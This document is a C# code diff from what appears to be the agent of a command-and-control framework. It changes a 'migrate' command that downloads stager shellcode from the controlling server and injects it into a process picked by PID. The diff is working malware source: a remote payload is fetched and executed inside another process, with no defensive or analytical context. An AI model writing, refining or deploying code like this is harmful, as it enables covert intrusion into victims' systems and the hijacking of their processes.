@@ -15,8 +15,6 @@ namespace Agent.Commands
     {
         public override string Name => "migrate";
 
-        public const string ShellCodePath = "Stager/Default_Listener/Agent.bin";
-
         public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
         {
             if (task.SplittedArgs.Length < 1)
@@ -25,16 +23,10 @@ namespace Agent.Commands
                 return;
             }
 
-            var fileName = ShellCodePath;
-            var fileContent = commm.Download(fileName, a =>
-            {
-                result.Info = $"Downloading {fileName} ({a}%)";
-                commm.SendResult(result);
-            }).Result;
+            var shellcode =  commm.DownloadStagerBin().Result;
+            
 
-            this.Notify(result, commm, $"{fileName} Downloaded");
-
-            var shellcode = fileContent;
+            this.Notify(result, commm, $"Stager Downloaded");
 
             int processId = int.Parse(task.SplittedArgs[0]);
 
@@ -54,9 +46,6 @@ namespace Agent.Commands
                 if (!string.IsNullOrEmpty(injectRes.Output))
                     result.Result += injectRes.Output;
             }
-
-
-            
         }
     }
 }
